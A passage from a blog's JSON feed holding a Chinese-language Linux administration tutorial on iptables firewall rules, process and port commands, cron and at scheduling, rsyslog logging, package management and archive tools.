raw--&gt;mangle--&gt;nat--&gt;filter</p>\n</li>\n<li>\n<p>链 (chains) 是数据包传播的路径，每一条链其实就是众多规则中的一个检查清单，每一条链中可以有一条或数条规则。</p>\n</li>\n</ul>\n<h2 id=\"规则链\"><a class=\"anchor\" href=\"#规则链\">#</a> 规则链</h2>\n<h3 id=\"一些需要知道的规则链\"><a class=\"anchor\" href=\"#一些需要知道的规则链\">#</a> 一些需要知道的规则链</h3>\n<ol>\n<li>INPUT - 进来的数据包应用此规则链中的策略</li>\n<li>OUTPUT - 外出的数据包应用此规则链中的策略</li>\n<li>FORWARD - 转发数据包时应用此规则链中的策略</li>\n<li>PREROUTING - 对数据包作路由选择前应用此链中的规则 (记住！所有的数据包进来的时候都先由这个链处理)</li>\n<li>POSTROUTING - 对数据包作路由选择后应用此链中的规则 (所有的数据包出来的时候都先由这个链处理)</li>\n</ol>\n<p><span class=\"label\">完整的规则链</span></p>\n<p><img data-src=\"image005.png\" alt=\"\" /></p>\n<p>规则表的先后顺序:<br />\nraw-&gt;mangle-&gt;nat-&gt;filter</p>\n<p>规则链的先后顺序:<br />\n 入站顺序 PREROUTING-&gt;INPUT<br />\n 出站顺序：OUTPUT-&gt;POSTROUTING<br />\n 转发顺序：PREROUTING-&gt;FORWARD-&gt;POSTROUTING</p>\n<h2 id=\"iptables传输数据包的过程\"><a class=\"anchor\" href=\"#iptables传输数据包的过程\">#</a> iptables 传输数据包的过程</h2>\n<p>当一个数据包进入网卡时，它首先进入 PREROUTING 链，内核根据数据包目的 IP 判断是否需要转送出去。</p>\n<p>如果数据包就是进入本机的，它就会向下移动，到达 INPUT 链。数据包到了 INPUT 链后，任何进程都会收到它。本机上运行的程序可以发送数据包，这些数据包会经过 OUTPUT 链，然后到达 POSTROUTING 链输出。</p>\n<p>如果数据包是要转发出去的，且内核允许转发，数据包就会经过 FORWARD 链，然后到达 POSTROUTING 链输出。</p>\n<p><img data-src=\"image006.png\" alt=\"\" /></p>\n<h2 id=\"iptables命令\"><a class=\"anchor\" href=\"#iptables命令\">#</a> iptables 命令</h2>\n<p>iptables 格式:<br />\niptables [-t 表名] 选项 [链名] [条件] [-j 控制类型]</p>\n<p><img data-src=\"image007.png\" alt=\"\" /></p>\n<p>详细解释见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vdmF0aGUvcC82OTczNjU2Lmh0bWw=\"> https://www.cnblogs.com/vathe/p/6973656.html</span><br />\n 有人总结的挺全的就不造轮子了（懒）。</p>\n<h2 id=\"iptables常识与常用命令\"><a class=\"anchor\" href=\"#iptables常识与常用命令\">#</a> iptables 常识与常用命令</h2>\n<p>CentOS7 默认的防火墙不是 iptables, 而是 firewalle.<br />\n 如果你没有安装 iptables 的话，你可以使用以下命令进行安装<br />\n systemctl stop firewalld<br />\nsystemctl disable firewalld<br />\nsystemctl mask firewalld<br />\n 上面的意思是先屏蔽掉原有的 firewall 防火墙，下面我们就开始安装 iptables，至于为什么要安装 IPtables 我就不讲了<br />\n yum install iptables iptables-services -y</p>\n<p>设置规则<br />\n #查看 iptables 现有规则<br />\n iptables -L -n<br />\n# 先允许所有，不然有可能会杯具<br />\n iptables -P INPUT ACCEPT<br />\n# 清空所有默认规则<br />\n iptables -F<br />\n# 清空所有自定义规则<br />\n iptables -X<br />\n# 所有计数器归 0<br />\niptables -Z<br />\n# 允许来自于 lo 接口的数据包 (本地访问)<br />\niptables -A INPUT -i lo -j ACCEPT<br />\n# 开放 22 端口<br />\n iptables -A INPUT -p tcp --dport 22 -j ACCEPT<br />\n# 开放 21 端口 (FTP)<br />\niptables -A INPUT -p tcp --dport 21 -j ACCEPT<br />\n# 开放 80 端口 (HTTP)<br />\niptables -A INPUT -p tcp --dport 80 -j ACCEPT<br />\n# 开放 443 端口 (HTTPS)<br />\niptables -A INPUT -p tcp --dport 443 -j ACCEPT<br />\n# 允许 ping<br />\niptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT<br />\n# 允许接受本机请求之后的返回数据 RELATED, 是为 FTP 设置的<br />\n iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT<br />\n# 其他入站一律丢弃<br />\n iptables -P INPUT DROP<br />\n# 所有出站一律绿灯<br />\n iptables -P OUTPUT ACCEPT<br />\n# 所有转发一律丢弃<br />\n iptables -P FORWARD DROP</p>\n<p>其他规则设定<br />\n #如果要添加内网 ip 信任（接受其所有 TCP 请求）<br />\niptables -A INPUT -p tcp -s 45.96.174.68 -j ACCEPT<br />\n# 过滤所有非以上规则的请求<br />\n iptables -P INPUT DROP<br />\n# 要封停一个 IP，使用下面这条命令：<br />\niptables -I INPUT -s ... -j DROP<br />\n# 要解封一个 IP，使用下面这条命令:<br />\niptables -D INPUT -s ... -j DROP</p>\n<p>#保存上述规则<br />\n service iptables save<br />\n 开启 iptables 服务<br />\n #注册 iptables 服务<br />\n #相当于以前的 chkconfig iptables on<br />\nsystemctl enable iptables.service<br />\n# 开启服务<br />\n systemctl start iptables.service<br />\n# 查看状态<br />\n systemctl status iptables.service</p>\n<h1 id=\"linux进程\"><a class=\"anchor\" href=\"#linux进程\">#</a> Linux 进程</h1>\n<p>推荐一篇博客，《<span class=\"exturl\" data-url=\"aHR0cHM6Ly9saW51eC5jbi9hcnRpY2xlLTg0NTEtMS5odG1s\">关于 Linux 进程你所需要知道的一起</span>》</p>\n<h2 id=\"top命令实时的查看进程的状态\"><a class=\"anchor\" href=\"#top命令实时的查看进程的状态\">#</a> top 命令：实时的查看进程的状态</h2>\n<p>top 是一个前台程序，所以是可以交互的</p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">常用交互命令</th>\n<th style=\"text-align:left\">解释</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">q</td>\n<td style=\"text-align:left\">退出程序</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">l</td>\n<td style=\"text-align:left\">切换显示平均负载和启动时间的信息</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">P</td>\n<td style=\"text-align:left\">根据 CPU 使用百分比大小进行排序</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">M</td>\n<td style=\"text-align:left\">根据驻留内存大小进行排序</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">i</td>\n<td style=\"text-align:left\">忽略闲置和僵死的进程，这是一个开关式命令</td>\n</tr>\n<tr>\n<td style=\"text-align:left\">k</td>\n<td style=\"text-align:left\">终止一个进程，系统提示输入 PID 及发送的信号值。</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"ps命令\"><a class=\"anchor\" href=\"#ps命令\">#</a> ps 命令</h2>\n<p>ps -ef 显示所有进程的详细信息</p>\n<p><img data-src=\"image008.png\" alt=\"\" /></p>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:left\">UID</th>\n<th style=\"text-align:left\">PID</th>\n<th style=\"text-align:left\">PPID</th>\n<th style=\"text-align:left\">C</th>\n<th style=\"text-align:left\">STIME</th>\n<th style=\"text-align:left\">TTY</th>\n<th style=\"text-align:left\">CMD</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:left\">用户 ID</td>\n<td style=\"text-align:left\">进程的 ID</td>\n<td style=\"text-align:left\">父进程 ID</td>\n<td style=\"text-align:left\">进程占用 CPU 的百分比</td>\n<td style=\"text-align:left\">进程启动的时间</td>\n<td style=\"text-align:left\">该进程在那个终端上运行。若与终端无关，则显示？若为 pts/0 等，则表示由网络连和参数接主机进程。</td>\n<td style=\"text-align:left\">命令的名称和参数</td>\n</tr>\n</tbody>\n</table>\n<p>ps -aux 显示所有进程信息</p>\n<p><img data-src=\"image009.png\" alt=\"\" /><br />\n<img data-src=\"image010.png\" alt=\"\" /></p>\n<p>ps -A 显示所有的进程信息<br />\n ps -u root 显示指定用户的进程信息<br />\n ps -l 显示目前属于本次登陆得 PID 相关信息</p>\n<p><code>ps -ef|grep sshd|grep -v &quot;grep&quot;</code>  配合管道符与 grep，显示 sshd 的进程信息。</p>\n<h2 id=\"kill-命令\"><a class=\"anchor\" href=\"#kill-命令\">#</a> kill 命令</h2>\n<p>kill 命令：用于删除执行的程序或工作，通过向进程发送指定的信号来结束进程。</p>\n<p>用法：kill  [信号] PID</p>\n<p>常用信号：<br />\n2  结束进程，不是强制性的，&quot;Ctrl + C&quot; 发出的就是 kill -2 信号<br />\n 3  退出<br />\n 9  杀死进程，强制结束进程。</p>\n<h1 id=\"端口\"><a class=\"anchor\" href=\"#端口\">#</a> 端口</h1>\n<p>在 Linux 操作系统下，系统共定义了 65536 个可用的端口。<br />\n对于 0-1023 端口，都需要 root 身份才能启用，这些端口主要用于系统一些常见的通信服务中。比如: 21 ftp 服务、22 ssh 服务、80 http 服务等...<br />\n 端口的开启和关闭也就是软件服务的启动和关闭</p>\n<h2 id=\"chkconfig命令\"><a class=\"anchor\" href=\"#chkconfig命令\">#</a> chkconfig 命令</h2>\n<p>chkconfig 来判断服务是开启还是关闭状态<br />\n例如 chkconfig --list sshd</p>\n<h2 id=\"netstat命令\"><a class=\"anchor\" href=\"#netstat命令\">#</a> netstat 命令</h2>\n<p>netstat 命令：用于显示 tcp, udp 的端口和进程情况<br />\n用法:<br />\nnetstat [选项]<br />\n-a 显示所有<br />\n - t 仅显示 tcp 相关选项<br />\n - u 仅显示 udp 相关选项<br />\n - n 拒绝显示别名，能显示数字的全部转化为数字<br />\n - l 仅列出在 Listen (监听) 的服务状态<br />\n - p 显示建立相关链接的程序名</p>\n<p>常用命令:<br />\nnetstat-antlp // 查看当前所有 tcp 端口<br />\n netstat-antulp|grep 80 // 查看所有 80 端口使用情况</p>\n<h1 id=\"linux计划任务\"><a class=\"anchor\" href=\"#linux计划任务\">#</a> linux 计划任务</h1>\n<p>计划任务，就是在约定好的时间执行已经计划好的工作。<br />\n未来的某时间点执行一次某任务或者周期性的运行某个任务，执行结果会通过邮形式发送给用户。</p>\n<h2 id=\"安全与计划任务\"><a class=\"anchor\" href=\"#安全与计划任务\">#</a> 安全与计划任务</h2>\n<p>挖矿病毒：<br />\n使用 top 查看 CPU，显示进程占 cpu99% 以上。杀掉进程后，到了晚上还是会自动运行进程。<br />\n检测定时任务，发现有一个异常的定时任务</p>\n<h2 id=\"at命令\"><a class=\"anchor\" href=\"#at命令\">#</a> at 命令</h2>\n<p>at 命令 一次性计划任务<br />\n默认自带 at<br />\n <code>yum install at -y</code>     下载 at</p>\n<p>开启服务:<br />\nservice atd start</p>\n<p>用法:<br />\nat (选项)<br />\n 选项<br />\n - f: 指定包含具体指令的任务文件；<br />\n-q: 指定新任务的队列名称；<br />\n-l: 显示待执行任务的列表；<br />\n-d: 删除指定的待执行任务；<br />\n-m: 任务执行完成后向用户发送 E-mail;</p>\n<p><span class=\"label\">实例</span></p>\n<p>at 10:00    确切时间<br />\n at now +10 minutes  十分钟后执行<br />\n at 17:04 04/04/2018  2018483817:04 执行<br />\n at 17:04 04/04/2018  2018483817:04 执行</p>\n<p>at 1am tomorrow 明天上午一点运行作业<br />\n at-c id    根据作业 ID 查看执行细节<br />\n atq        查看待处理的任务<br />\n atrm id    删除 id 的任务</p>\n<h2 id=\"crondtab命令\"><a class=\"anchor\" href=\"#crondtab命令\">#</a> crondtab 命令</h2>\n<p>crondtab 命令 周期性计划任务</p>\n<p>crond 是 linux 下用来周期性的执行某种任务或等待处理某些事件的一个守护进程。</p>\n<p>Linux 系统上系统服务是默认启动的，使用者控制计划任务命令:crontab 命令。</p>\n<p>crontab 其实是一个命令，用来读取和修改名为 crontab 的文件。/etc/crontab 文件包含了要定时执行的程序列表。</p>\n<p>安装 crontab: 默认自带<br />\n <code>yum install crontabs</code></p>\n<p>服务命令:</p>\n<p>service crond start // 启动服务 service crond stop // 关闭服务 service crond restart// 重启服务 service crond reload // 重新载入配置</p>\n<p>crontab 命令 周期性计划任务</p>\n<p>1、命令格式:</p>\n<p>crontab [-u user] file<br />\ncrontab [-u user] 【选项】</p>\n<p>常用选项:</p>\n<p>-e: 编辑计划任务 edit<br />\n-l: 查看计划任务 display<br />\n-u: 指定用户</p>\n<p>常用命令:</p>\n<p>crontab -l 列出当前用户的计划任务<br />\n crontab -r 删除当前用户所有的计划任务<br />\n crontab -e 编辑当前用户的计划任务<br />\n crontab-e -u root 编辑 root 用户的计划任务</p>\n<p>第一列：分钟 (0-59)<br />\n 第二列：小时 (0-23)<br />\n 第三列：天 (1-31)<br />\n 第四列：月 (1-12)<br />\n 第五列：周 (0-6) 0 表示周日</p>\n<p>&quot;<em>&quot; 表示所有的取值，就是</em> / 1&quot;<br />\n&quot;/&quot; 表示每的意思<br />\n */5&quot; 表示每 5 个单位<br />\n &quot;-&quot; 表示从某个数字到某个数字<br />\n &quot;,&quot; 表示分散的数字</p>\n<p><img data-src=\"crontab.png\" alt=\"\" /></p>\n<p><span class=\"label\">实例</span><br />\n<img data-src=\"image011.png\" alt=\"\" /></p>\n<h1 id=\"日志服务\"><a class=\"anchor\" href=\"#日志服务\">#</a> 日志服务</h1>\n<h2 id=\"基础信息\"><a class=\"anchor\" href=\"#基础信息\">#</a> 基础信息</h2>\n<p>在 CentOS 6.x 中，日志服务已经由 rsyslogd 取代了原先的 syslogd.<br />\nrsyslogd 相比 syslogd 具有一些新的特点:<br />\n 基于 TCP 网络协议传输日志信息。<br />\n更安全的网络传输方式。<br />\n有日志信息的即时分析框架。<br />\n后台数据库。<br />\n在配置文件中可以写简单的逻辑判断。<br />\n与 syslog 配置文件相兼容。</p>\n<p>查看 rsyslogd 服务是否启动<br />\n <code>ps aux|grep &quot;rsyslogd&quot;|grep -v &quot;grep&quot;</code> <br />\n 查询 rsyslogd 服务的自启动状态<br />\n <code>chkconfig --list|grep &quot;rsyslog&quot;</code> <br />\n <code>systemctl list-unit-files|grep &quot;rsyslog&quot;</code></p>\n<p>在 Linux 系统中有一部分日志不是由 rsyslogd 服务来管理的，比如 apache 服务，它的日志是由 Apache 软件自己产生并记录的，并没有调用 rsyslogd 服务，但是 apache 日志文件的格式和系统默认日志的格式是一致的。</p>\n<p>在 Linux 系统中有一部分日志不是由 rsyslogd 服务来管理的，比如 apache 服务，它的日志是由 Apache 软件自己产生并记录的，并没有调用 rsyslogd 服务，但是 apache 日志文件的格式和系统默认日志的格式是一致的。</p>\n<p>日志文件是重要的系统信息文件，其中记录了许多重要的系统事件，包括用户的登录信息、系统的启动信息、系统的安全信息、邮件相关信息、各种服务相关信息等。这些信息有些非常敏感，所以在 Linux 中这些日志文件只有 root 用户可以读取。<br />\n系统日志文件的保存位置是 /var/log/ 目录</p>\n<p><img data-src=\"image012.png\" alt=\"\" /><br />\n<img data-src=\"image013.png\" alt=\"\" /><br />\n<img data-src=\"image014.png\" alt=\"\" /></p>\n<p>日志服务 rsyslogd 记录的日志文件格式包含以下 4 列:</p>\n<p>1. 事件产生的时间。<br />\n2. 产生事件的服务器的主机名。<br />\n3. 产生事件的服务名或程序名。<br />\n4. 事件的具体信息。</p>\n<p>/var/log/secure 日志文件内容:</p>\n<p><img data-src=\"image015.png\" alt=\"\" /></p>\n<p>/var/log/secure 记录验证和授权方面的倍息，只要涉及账户和密码的程序都会记录，比如系统的登录、ssh 的登录、su 切换用户，sudo 授权，甚至添加用户和修改用户密码都会记录在这个日志文件中</p>\n<p>/var/log/wtmp 永久记录所有用户的登陆、注销信息，同时记录系统的后动、重启、关机事件</p>\n<p>/var/tun/ulmp 记录当前已经登录的用户的信息。这个文件会随着用户的登录和注销而不断变化，只记录当前登录用户的信息。</p>\n<h2 id=\"rsyslogd配置文件\"><a class=\"anchor\" href=\"#rsyslogd配置文件\">#</a> rsyslogd 配置文件</h2>\n<p>rsyslogd 服务的配置文件是 /etc/rsyslog.conf , 其中主要定义了服务的名称、日志等级和日志记录位置。</p>\n<p>该配置文件的基本格式如下所示:</p>\n<p>authpriv.*                  /var/log/secure<br />\n# 服务名称 [连接符号] 日志等级   日志记录位置</p>\n<h2 id=\"日志等级\"><a class=\"anchor\" href=\"#日志等级\">#</a> 日志等级</h2>\n<p><img data-src=\"image016.png\" alt=\"\" /></p>\n<p>详细见<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbmJsb2dzLmNvbS9rbGI1NjEvcC8xMjAxNDI2OC5odG1s\"> https://cnblogs.com/klb561/p/12014268.html</span></p>\n<h2 id=\"连接符\"><a class=\"anchor\" href=\"#连接符\">#</a> 连接符</h2>\n<p>连接符号:</p>\n<ol>\n<li>&quot;.&quot; 代表只要比后面的等级高的 (包含该等级) 日志都记录。比如，&quot;<span class=\"exturl\" data-url=\"aHR0cDovL2Nyb24uaW5mbw==\">cron.info</span>&quot; 代表 cron 服务产生的日志，只要日志等级大于等于 info 级别，就记录。</li>\n<li>&quot;.=&quot; 代表只记录所需等级的日志，其他等级的日志都不记录。比如，&quot;*.=emerg&quot; 代表人和日志服务产生的日志，只要等级是 emerg 等级，就记录。这种用法极少见，了解就好。</li>\n<li>&quot;.!&quot; 代表不等于，也就是除该等级的日志外，其他等级的日志都记录。</li>\n</ol>\n<h2 id=\"日志记录位置\"><a class=\"anchor\" href=\"#日志记录位置\">#</a> 日志记录位置</h2>\n<p>日志记录位置：当前日志输出到哪个日志文件中保存</p>\n<p>日志文件的绝对路径。例如: &quot;/ar/log/secure&quot;</p>\n<p>系统设备文件。如 &quot;/dev/lpo&quot; 代表第一台打印机，如果日志保存位置是打印机设备，当有日志时就会在打印机上打印。</p>\n<p>用户名。如果是 &quot;root&quot; , 把日志发送给 root 用户 (用户要在线) &quot;*&quot; 代表发送给所有在线用户，如 &quot;mail**&quot; 就会把 mail 服务产生的所有级别的日志发送给所有在线用户。发给多个在线用户，则用户名之间用 &quot;,&quot; 分隔。</p>\n<p>忽略或丢弃日志。如果接收日志的对象是 &quot;~&quot; , 则代表这个日志不会被记录，而被直接丢弃。如 &quot;local3.*~&quot; 代表忽略 local3 服务类型所有的日志都不记录。</p>\n<h2 id=\"日志管理\"><a class=\"anchor\" href=\"#日志管理\">#</a> 日志管理</h2>\n<p>日志管理:</p>\n<p>日志维护的最主要的工作就是把旧的日志文件删除，从而腾出空间保存新的日志文件。</p>\n<p>logrotate 就是用来进行日志轮替的，就是把旧的日志文件移动并改名，同时创建一个新的空日志文件用来记录新日志，当旧日志文件超出保存的范围时就删除。</p>\n<p>日志文件的命名规则:</p>\n<ol>\n<li>服务加日期</li>\n<li>服务加数字</li>\n</ol>\n<p>查看日志备份文件<br />\n ls /var/log</p>\n<p>logrotate 令可以进行日志转储 (轮替)</p>\n<p>logrotate 命令会依据 /etc/logrotate.conf 配置文件的配置，来判断配置文件中的日志是否符合日志轮替的条件 (比如，日志备份时间已经满一周) , 如果符合，日志就会进行轮替。</p>\n<p>/etc/logrotate.conf 配置文件的<br />\n cat /etc/logrotate.conf<br />\n 详细讲解</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2MuYmlhbmNoZW5nLm5ldC92aWV3LzExMDYuaHRtbA==\">http://c.biancheng.net/view/1106.html</span></p>\n<h1 id=\"系统服务\"><a class=\"anchor\" href=\"#系统服务\">#</a> 系统服务</h1>\n<p>什么是系统服务？<br />\n 服务是在后台运行的应用程序，并且可以提供一些本地系统或网络的功能。<br />\n我们把这些应用程序称作服务，也就是 Service.<br />\nLinux 中常见的服务有那些，这些服务怎么分类，服务如何启动，服务如何自启动，服务如何查看？</p>\n<p>服务 Service, Daemon 这个词也经常伴随着出现。<br />\nDaemon 翻 i 成 &quot;守护进程&quot;<br />\n 守护进程：就是为了实现服务、功能的进程。<br />\n比如，apache 服务就是服务 (Service) , 它是用来实现 Web 服务的。<br />\n那么，启动 apache 服务的进程是哪个进程呢？<br />\nhttpd 这个守护进程 (Daemon) 。<br />\n在 Linux 中就是通过启动 httpd 进程来启动 apache 服务的。<br />\n也就是说，守护进程就是服务在后台运行的真实进程。</p>\n<p><img data-src=\"image017.png\" alt=\"\" /></p>\n<p>Linux 中的服务按照安装方法不同可以分为 RPM 包默认安装的服务和源码包安装的服务两大类。</p>\n<p>区别:</p>\n<p>RPM 包安装到系统默认位置，可以被服务管理命令识别；但是源码包安装到手工指定位置，当然就不能被服务管理命令识别了 (可以手工修改为被服务管理命令识别)。</p>\n<h2 id=\"启动服务\"><a class=\"anchor\" href=\"#启动服务\">#</a> 启动服务</h2>\n<p>启动服务方式:</p>\n<p>1) 使用 /etc/init.d/ 目录中的启动脚本来启动独立的服务</p>\n<p>2) 使用 service 命令来启动独立的服务</p>\n<p>1) 使用 /etc/init.d/ 目录中的启动脚本来启动独立的服务</p>\n<p>所有独立服务的启动脚本都存放在 /etc/init.d/ 目录中，调用脚本就可以启动独立的服务了。</p>\n<p>命令格式如下:</p>\n<p>/etc/init.d/ 独立服务名参数参数:</p>\n<p>start: 启动服务；<br />\nstop: 停止服务；<br />\nstatus: 查看服务状态；<br />\nrestart: 重启动服务；</p>\n<p>2) 使用 service 命令来启动独立的服务</p>\n<p>在 CentOS 系统中，我们还可以依赖 service 命令来启动独立的服务。service 命令实际上只是一个脚本，这个脚本仍然需要调用 /etc/init.d/ 中的启动脚本来启动独立的服务。</p>\n<p>service 命令格式如下:</p>\n<p>service 独立服务名 start|stop|restart|..</p>\n<p><code>service --status-all 查看所有服务</code></p>\n<h2 id=\"服务的自启动\"><a class=\"anchor\" href=\"#服务的自启动\">#</a> 服务的自启动</h2>\n<p>使用 chkconfig 服务自启动管理命令</p>\n<p>格式:</p>\n<p>查看所有服务的自启动状态<br />\n chkconfig -list</p>\n<p>设置某服务的自启动状态</p>\n<p>chkconfig [--level 运行级别][独立服务名][on|off]</p>\n<p><img data-src=\"image018.png\" alt=\"\" /></p>\n<p>想把某个已经安装了的服务添加为系统服务，可以执行以下命令：</p>\n<p><code>chkconfig --add 服务名称</code>           (首先，添加为系统服务，注意 add 前面有两个横杠)</p>\n<p><code>chkconfig -leve 启动级别 服务名 on</code></p>\n<h1 id=\"下载与安装\"><a class=\"anchor\" href=\"#下载与安装\">#</a> 下载与安装</h1>\n<h2 id=\"wget\"><a class=\"anchor\" href=\"#wget\">#</a> wget</h2>\n<p>wget 是一个下载文件的工具，它用在命令行下</p>\n<p>语法：wget [选项] url</p>\n<p>选项：</p>\n<p>-V 显示 wget 版本信息并退出。<br />\n-h 打印此帮助<br />\n - O 指定下载文件的别名。</p>\n<p><img data-src=\"image019.png\" alt=\"\" /></p>\n<h2 id=\"rpm\"><a class=\"anchor\" href=\"#rpm\">#</a> rpm</h2>\n<p>Linux rpm 命令用于管理套件，增强了程序安装卸载的管理。</p>\n<p>RPM 的功能：打包、安装、查询、升级、卸载...</p>\n<p>缺点: RPM 无法解决软件包的依赖关系</p>\n<p>RPM 包的命名规范: name-version-release.os.arch.rpm</p>\n<p><img data-src=\"image020.png\" alt=\"\" /></p>\n<p>!{}(image021.png)</p>\n<h2 id=\"yum\"><a class=\"anchor\" href=\"#yum\">#</a> yum</h2>\n<p>yum 基于 RPM 包管理，能够从指定的服务器自动下载 RPM 包和安装</p>\n<p>优点：可以自动处理关联关系，并且一次安装所有依赖的软件包，无须繁琐地一次下载，安装。</p>\n<p>语法 ：<br />\nyum [选项] [包……]</p>\n<p>选项：<br />\n-h 帮助<br />\n - y 当安装过程中提示选择全部为 “yes”<br />\n-q 不显示安装过程</p>\n<p>检测有没有安装 yum<br />\nyum -h<br />\nrpm -qa | grep yum</p>\n<ol>\n<li><span class=\"label info\">相关命令</span></li>\n</ol>\n<p>1・列出所有可更新的软件清单命令: yum check-update<br />\n2 更新所有软件命令: yum update<br />\n3 仅安装指定的软件命令: yum install 包名称<br />\n 4 仅更新指定的软件命令: yum update 包名称<br />\n 5 列出所有可安装的软件清单命令: yum list<br />\n6 删除删除命令: yum remove 包名称<br />\n 7 清除缓存命令:<br />\n 清除缓存目录 (/var/cache/yum) 下的软件包<br />\n命令：yum clean packages</p>\n<p>清除缓存目录 (/var/cache/yum) 下的 headers<br />\n 命令：yum clean headers</p>\n<p>清除缓存目录 (/var/cache/yum) 下旧的 headers<br />\n 命令：yum clean oldheaders</p>\n<p>清除缓存目录 (/var/cache/yum) 下的软件包及旧的 headers<br />\n 命令：yum clean, yum clean all (= yum clean packages; yum clean oldheaders)</p>\n<ol start=\"2\">\n<li><span class=\"label info\">yum list 相关命令</span></li>\n</ol>\n<p><img data-src=\"iamge022.png\" alt=\"\" /></p>\n<ol start=\"3\">\n<li>安装应用程序</li>\n</ol>\n<p>语法: yum [-y] install 包 1 包 2…… 包 n<br />\nyum install wget    使用安装 wget</p>\n<p>升级软件包</p>\n<p>命令格式: yum update 包 1 包 2…… 包 n<br />\nyum check-update 检测可升级的包</p>\n<p>卸载软件包</p>\n<p>命令格式: yum remove 包 1 包 2…… 包 n<br />\n 注意：卸载时注意依赖关系</p>\n<h1 id=\"文件打包和解压缩\"><a class=\"anchor\" href=\"#文件打包和解压缩\">#</a> 文件打包和解压缩</h1>\n<p>linux 中常用的五种压缩格式: .zip .gz .tar.gz .bz2 .tar.bz2</p>\n<p>打包和压缩:</p>\n<p>打包是指将一大堆文件或目录什么的变成一个总的文件<br />\n压缩则是将一个大的文件通过一些压缩算法变成一个小文件</p>\n<h2 id=\"tar命令\"><a class=\"anchor\" href=\"#tar命令\">#</a> tar 命令</h2>\n<p>Linux 中的很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你就得先借助另它的工具将这一大堆文件先打成一个包，然后再就原来的压缩程序进行压缩。</p>\n<p>Liunx 下最常用的打包命令是 tar, 使用 tar 程序打出来的包我们常称为 tar 包，tar 包文件的命通常都是以.tar 结尾的。<br />\n生成 tar 包后，就可以用其它的程序来进行压缩了，所以首先就来讲讲 tar 命令的基本用法</p>\n<p>语法:<br />\ntar 【选项】 打包文件包 源文件<br />\n选项:<br />\n-c: 打包<br />\n - v: 显示详细过程<br />\n - x: 解打包 / 压缩<br />\n - z: 通过 gzip 压缩 / 解压文件<br />\n - j: 通过 bz2 压缩 / 解压文件<br />\n - C: 解压到指定目录<br />\n - f filename: 指定打包后的文件名 (必选，这个参数是最后一个参数，后面只能接文件名)</p>\n<p>常用命令:<br />\ntar -cf all.tar *.jpg  #将所有.jpg 的文件打成一个名为 all.tar 的包<br />\n tar -xvf all.tar  #解出 all.tar 包中所有文件，-x 是解开的意思</p>\n<p>为了方便用户在打包解包的同时可以压缩或解压文件，tar 提供了一种特殊的功能 -- 就是 tar 可以在打包或解包的同时调用其它的压缩程序，比如调用 gzip.bzip2 等。</p>\n<h2 id=\"解压缩与压缩\"><a class=\"anchor\" href=\"#解压缩与压缩\">#</a> <span class=\"label info\">解压缩与压缩</span></h2>\n<p><img data-src=\"image022.png\" alt=\"\" /></p>\n<h2 id=\"zip\"><a class=\"anchor\" href=\"#zip\">#</a> zip</h2>\n<p>zip 【选项】 【压缩文件】</p>\n<p>选项:<br />\n-m 将文件压缩并加入压缩文件后，删除原始文件，即把文件移到压缩文件中。<br />\n-q 不显示指令执行过程。<br />\n-r 递归处理，将指定目录下的所有文件和子目录一并处理。<br />\n-v 显示指令执行过程或显示版本信息。</p>\n<p>实例</p>\n<p>将 /home/html/ 这个目录下所有文件和文件夹打包为当前目录下的 html.zip:</p>\n<p>zip-qr html.zip /home/html</p>\n<h2 id=\"unzip\"><a class=\"anchor\" href=\"#unzip\">#</a> unzip</h2>\n<p>unzip 【选项】 【压缩文件】</p>\n<p>选项:</p>\n<p>-l 显示压缩文件内所包含的文件 - V 执行是时显示详细的信息。<br />\n-q 执行时不显示任何信息。<br />\n-d &lt;目录&gt; 指定文件解压缩后所要存储的目录。</p>\n<p>实例</p>\n<p>解压文件<br />\n <code>unzip abc.zip</code></p>\n<p>查看压缩文件中包含的文件:<br />\n <code>unzip-l abc.zip</code></p>\n<h2 id=\"gzip\"><a class=\"anchor\" href=\"#gzip\">#</a> gzip</h2>\n<ol>\n<li>tar 调用 gzipgzip 是 GNU 组织开发的一个压缩程序，.gz 结尾的文件就是 gzip 压缩的结果。与 gzip 相对的解压程序是 gunzip.<br />\ntar 中使用 - z 这个参数来调用 gzip 常用命令:</li>\n</ol>\n<p><code>tar-czf all.tar.gz *.jpg</code>   #将所有.jpg 的文件打成一个 tar 包，并且将其用 gzip 压缩，生成一个 gzip 压缩过的包 all.tar.gz</p>\n<p><code>tar-xzf all.tar.gz</code>   #将包 all.tar.z 解开</p>\n<ol start=\"2\">\n<li>tar 调用 bzip2bzip2 是一个压缩能力更强的压缩程序，.bz2 结尾的文件就是 bzip2 压缩的结果。与 bzip2 相对的解压程序是 bunzip</li>\n</ol>\n<p>tar 中使用 - j 这个参数来调用 bzip2</p>\n<p>常用命令:</p>\n<p>tar -cjfall.tar.bz2 *.jpg #将所有.jpg 的文件打成一个 tar 包，并且将其用 bzip2 压缩，生成一个 bzip2 压缩过的包，包名为 all.tar.bz2</p>\n<p>tar -xjf all.tar.bz2  #将上面产生的包解开</p>\n",
            "tags": [
                "Linux",
                "Linux"
            ]
        },
        {
            "id": "https://self-ferry.github.io/2021/02/07/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "url": "https://self-ferry.github.io/2021/02/07/%E5%88%9D%E8%AF%86python%E6%B5%8B%E8%AF%95%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91/",
            "title": "初识python测试驱动开发",
            "date_published": "2021-02-07T12:20:18.000Z",
